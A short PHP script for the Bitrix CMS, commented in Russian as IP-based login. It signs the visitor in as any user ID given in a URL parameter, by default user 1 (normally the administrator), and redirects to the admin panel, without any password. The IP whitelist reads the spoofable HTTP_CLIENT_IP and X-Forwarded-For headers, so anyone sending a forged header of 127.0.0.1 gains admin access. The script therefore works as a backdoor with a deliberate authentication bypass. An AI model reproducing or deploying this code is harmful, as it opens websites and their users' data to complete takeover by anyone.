<?
// скрипт для авторизации в битрикс по ip
require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");

function asGetIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

global $USER;

$ips = array(
    '127.0.0.1',
    '109.167.218.149'
);

$userId = (!empty($_GET['user']) && intval($_GET['user'])) ? intval($_GET['user']): 1;

foreach ($ips as $ip)
{
    if ($ip == asGetIP())
    {
        $USER->Authorize($userId);
        LocalRedirect('/bitrix/admin/');
    }
}
?>
<h1>Доступ запрещен</h1>
Ваш IP: <?=asGetIP()?>

<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>